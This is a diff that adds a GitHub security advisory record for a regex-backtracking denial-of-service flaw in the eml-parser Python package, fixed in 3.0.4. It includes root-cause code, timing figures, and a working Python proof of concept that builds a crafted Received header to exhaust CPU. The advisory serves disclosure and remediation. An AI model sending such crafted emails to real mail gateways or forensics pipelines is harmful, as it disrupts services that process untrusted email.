@@ -1,0 +1,103 @@
+{
+  "id": "GHSA-m4g8-47f9-h588",
+  "modified": "2026-11-19T23:00:36.652146365Z",
+  "published": "2026-11-19T22:47:08Z",
+  "aliases": [
+    "CVE-2026-129307"
+  ],
+  "summary": "eml_parser: Algorithmic-complexity DoS (O(n^4) regex backtracking) in Received-header parsing",
+  "details": "### Summary\n\n`eml_parser.routing.parserouting()` dynamically builds a regex from up to four greedy `.*` groups (`from (?P\u003cfrom\u003e.*)by (?P\u003cby\u003e.*)with (?P\u003cwith\u003e.*)for (?P\u003cfor\u003e.*)`) terminated by an escaped literal of the date extracted from a **normalized** copy of the `Received` header. Because the date literal comes from the normalized text but is searched in the original line, a crafted header can make the trailing literal unmatchable; the search then fails at every start position only after exhaustively backtracking the four nested greedy groups — **O(n^4)** in header length. A single ~5.9 KB email pins one CPU core for ~12 seconds; doubling the input multiplies the cost ~25x, so a ~13 KB header takes minutes and a ~25 KB header effectively hangs the parse worker.\n\n### Details\n\nRoot cause: `eml_parser/routing.py:140-148` (v3.0.3):\n\n```python\nreg = ''\nfor item in tout:\n    reg += item[1] + '(?P\u003c' + item[1].strip() + '\u003e.*)'   # e.g. 'from (?P\u003cfrom\u003e.*)'\nif npdate:\n    reg += eml_parser.regexes.escape_special_regex_chars.sub(r\"\"\"\\\\\\1\"\"\", npdate)\nreparse = re.compile(reg)\nreparseg = reparse.search(line)   # searched in the ORIGINAL line\n```\n\n`npdate` is extracted from `npline`, a normalized copy of the header (spacing added around `(`, `)`, `;` at routing.py:79-81; parenthesized text removed at line 82; whitespace collapsed at line 83), so it is not guaranteed to be a substring of `line`. An unbalanced `(` in the date tail (e.g. `+0000(comment`) becomes ` ( comment` in `npline` but stays `(comment` in `line`, making the mandatory trailing literal unmatchable.\n\nData flow: attacker-controlled `Received:` header (arbitrary length; the custom policy sets `max_line_length=0`) -\u003e `parser.py:352-355` (lowercased, whitespace-flattened, no size cap - unlike body text, which is sliced) -\u003e `parser.py:365` `routing.parserouting(...)` -\u003e O(n^4) search. Every Received header is processed, multiplying the cost, and the behavior cannot be disabled via any `EmlParser` option.\n\nMeasured on Python 3.14 (identical with stdlib `re` and the optional `regex` module):\n\n| Segments | Header size | Wall time |\n|---|---|---|\n| 20 | 1.4 KB | 0.022 s |\n| 40 | 2.9 KB | 0.43 s |\n| 80 | 5.8 KB | 12 s |\n| 160 (extrapolated) | 13 KB | ~5 min |\n\ncProfile attributes 83% of wall time to `re.Pattern.search` called from `routing.parserouting`. The parse completes normally (no exception) - it is pure CPU exhaustion.\n\nThis is distinct from GHSA-g47v-rwmh-r9f8 (recursion DoS in `get_raw_body_text()`, fixed via `MULTIPART_RECURSION_LIMIT` - different function and mechanism) and from issue #48 (old `url_regex_simple` body-path hang; body regexes now run on ~600-char slices, capping impact - the Received-header path is unsliced).\n\n### PoC\n\n```python\nimport eml_parser\n\nseg = 'from h{0}.example.com by mx{0}.example.com with esmtp for u{0}@example.com '\nreceived = ''.join(seg.format(i) for i in range(80)) + ';Mon, 01 Jan 2024 00:00:00 +0000(comment'\n# NB: unbalanced '(' in the date tail -\u003e the normalized date literal never occurs in the\n# searched line, so the dynamic 4-group greedy regex can never match and backtracks O(n^4).\n\neml = (\n    'Received: ' + received + '\\r\\n'\n    'From: attacker@evil.example\\r\\n'\n    'To: victim@target.example\\r\\n'\n    'Subject: poc\\r\\n'\n    'Content-Type: text/plain\\r\\n'\n    '\\r\\n'\n    'hello\\r\\n'\n).encode()\n\nimport time\nt0 = time.perf_counter()\neml_parser.EmlParser().decode_email_bytes(eml)\nprint(f'{time.perf_counter() - t0:.2f}s')   # ~12 s for a 5.9 KB input\n```\n\nObserved on v3.0.3: `eml size: 5887 bytes`, `decode_email_bytes() wall time: 12.33s`, message parses fine. Affected APIs: `decode_email`, `decode_email_bytes`, `parse_email`.\n\n### Impact\n\nAlgorithmic-complexity denial of service. Any application that parses untrusted email with eml_parser (mail gateways, phishing-analysis and forensics pipelines, ticketing systems) can have a parser worker pinned by a single small email; an attacker sending a steady trickle of such messages keeps workers permanently busy (CPU exhaustion, queue backlog) even behind per-message timeouts. No crash, corruption, or information leak - availability impact only.\n\nReporter credit: Niranjan Ganesan (https://securityinsights.io/, @iam-niranjan)\n\n\n### Resolution\n\nAn algorithmic complexity vulnerability ($O(n^4)$ ReDoS) in `eml_parser.routing.parserouting()` was resolved.\n\nPreviously, `parserouting()` dynamically constructed a regex using multiple greedy `.*` capture groups appended with a normalized date string (`npdate`). Because `npdate` was extracted from a normalized copy of the `Received` header line, formatting mismatches between `npdate` and the un-normalized input line could render the trailing literal unmatchable. This forced the engine into exhaustive backtracking across nested greedy groups on unmatchable inputs, causing high CPU consumption and potential worker hangs on malicious headers.\n\n**Fix:**\n\n1. **Dynamic Regex Construction:** Removed the static `npdate` suffix from the compiled pattern, replacing it with non-greedy field capture groups (`.*?`) terminated lazily by a semicolon or end-of-line anchor (`(?:;|$)`).\n2. **Keyword Ordering Logic:** Streamlined the routing keyword position detection to a single-pass `str.find()` search, removing $O(k^2)$ matrix evaluations.\n\nThese changes eliminate catastrophic backtracking and reduce processing time from $O(n^4)$ to linear $O(n)$ complexity.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "eml-parser",
+        "purl": "pkg:pypi/eml-parser"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "3.0.4"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "0.9",
+        "1.0",
+        "1.1",
+        "1.10",
+        "1.11",
+        "1.11.1",
+        "1.11.2",
+        "1.11.4",
+        "1.11.5",
+        "1.11.6",
+        "1.11.7",
+        "1.12.0",
+        "1.13.0",
+        "1.14.0",
+        "1.14.1",
+        "1.14.2",
+        "1.14.3",
+        "1.14.4",
+        "1.14.5",
+        "1.14.6",
+        "1.14.7",
+        "1.14.8",
+        "1.15.0",
+        "1.16.0",
+        "1.17.0",
+        "1.17.1",
+        "1.17.2",
+        "1.17.3",
+        "1.17.4",
+        "1.17.5",
+        "1.3",
+        "1.4",
+        "1.5",
+        "1.6",
+        "1.7",
+        "1.8",
+        "1.9",
+        "2.0.0",
+        "2.0.1",
+        "3.0.0",
+        "3.0.1",
+        "3.0.2",
+        "3.0.3"
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 3.0.3",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/11/GHSA-m4g8-47f9-h588/GHSA-m4g8-47f9-h588.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/GOVCERT-LU/eml_parser/security/advisories/GHSA-m4g8-47f9-h588"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-129307"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/GOVCERT-LU/eml_parser/commit/54ea6e9f54fecda3059283ccdb6a6fd99e7ce92f"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/GOVCERT-LU/eml_parser"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/GOVCERT-LU/eml_parser/releases/tag/v3.0.4"
+    }
+  ]
+}
